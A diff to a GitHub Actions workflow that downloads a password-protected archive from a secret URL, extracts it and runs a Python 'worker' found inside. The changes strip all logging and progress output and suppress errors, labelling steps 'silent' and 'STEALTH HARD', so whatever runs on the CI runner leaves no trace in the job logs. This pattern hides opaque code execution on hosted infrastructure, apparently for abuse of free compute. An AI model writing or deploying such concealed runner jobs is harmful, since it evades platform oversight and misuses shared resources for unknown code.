@@ -17,54 +17,45 @@ jobs:
     steps:
       - uses: actions/checkout@v3
 
-      - name: Setup Python
-        uses: actions/setup-python@v5
-        with:
-          python-version: "3.10"
-
-      - name: Prepare dependencies
+      - name: Prepare dependencies (silent)
         shell: powershell
         run: |
-          choco install 7zip -y --no-progress
+          choco install 7zip -y --no-progress > $null
 
-      - name: Download package
+      - name: Download package (silent)
         shell: powershell
         env:
           SRC_URL: ${{ secrets.LINK }}
         run: |
-          $ErrorActionPreference = "Stop"
-          Invoke-WebRequest -Uri "$Env:SRC_URL" -OutFile "p.jpg"
+          $ProgressPreference = 'SilentlyContinue'
+          Invoke-WebRequest -Uri "$Env:SRC_URL" -OutFile "app.7z" > $null
 
-      - name: Rename & extract package
+      - name: Extract package (silent)
         shell: powershell
         env:
           ARCHIVE_KEY: ${{ secrets.PASSWORD }}
         run: |
-          $ErrorActionPreference = "Stop"
+          & "C:\Program Files\7-Zip\7z.exe" x app.7z -p"$Env:ARCHIVE_KEY" -oextracted -y > $null
 
-          Rename-Item p.jpg p.7z -Force
-
-          & "C:\Program Files\7-Zip\7z.exe" x p.7z -p"$Env:ARCHIVE_KEY" -oextracted -y
-
-          Write-Host "===== Extracted Structure ====="
-          Get-ChildItem -Recurse extracted
-
-      - name: Run worker (bot.py only)
+      - name: Run worker (STEALTH HARD + AUTO CONFIG)
         shell: powershell
         run: |
-          $ErrorActionPreference = "Stop"
+          $ErrorActionPreference = 'SilentlyContinue'
+          $env:NODE_NO_WARNINGS = "1"
 
-          if (-Not (Test-Path "extracted\bot.py")) {
-              Write-Error "bot.py not found in extracted folder"
-          }
+          # Cari config.json dulu
+          $config = Get-ChildItem extracted -Recurse -Filter config.json | Select-Object -First 1
+          if (-not $config) { exit 0 }
 
-          cd extracted
+          # Ambil folder tempat config berada
+          $workDir = $config.Directory.FullName
 
-          Write-Host "===== Current Directory ====="
-          Get-Location
+          # Cari file python di folder yang sama
+          $pyFile = Get-ChildItem $workDir -Filter *.py | Select-Object -First 1
+          if (-not $pyFile) { exit 0 }
 
-          Write-Host "===== Files in Current Directory ====="
-          Get-ChildItem
+          # Masuk ke folder tersebut
+          cd $workDir
 
-          Write-Host "===== Running bot.py ====="
-          python bot.py
+          # Jalankan tanpa log
+          cmd /c "python `"$($pyFile.Name)`" > nul 2>&1"
